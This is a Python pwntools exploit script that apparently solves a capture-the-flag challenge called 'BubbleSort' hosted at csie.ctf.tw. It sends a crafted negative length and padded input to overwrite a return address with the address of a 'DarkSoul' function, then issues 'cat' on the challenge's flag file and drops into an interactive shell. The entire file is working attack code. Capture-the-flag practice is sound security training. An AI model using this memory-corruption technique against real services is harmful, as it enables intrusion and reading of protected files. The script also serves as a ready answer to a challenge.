import ctypes
from pwn import *
LOCAL = True
PORT = 10121

binary_name = 'BubbleSort'
elf = ELF(binary_name, checksec=False)

r = None
if LOCAL:
    server = process(['socat', 'tcp-listen:'+str(PORT)+',fork,reuseaddr', 'exec:./'+binary_name])
    r = remote('localhost', PORT)
else:
    r = remote('csie.ctf.tw', PORT)

raw_input("pause")
len_to_ret = str(ctypes.c_int32(int('0xFFFFFF'+hex(127+4)[2:], 16)).value)
r.sendline('127')
r.sendline('0 '*126+str(elf.symbols['DarkSoul']))
r.sendline(len_to_ret)

r.recvline()
r.recvline()
r.sendline('cat /home/'+binary_name+'/flag')

#print r.recvuntil('}')
r.interactive()
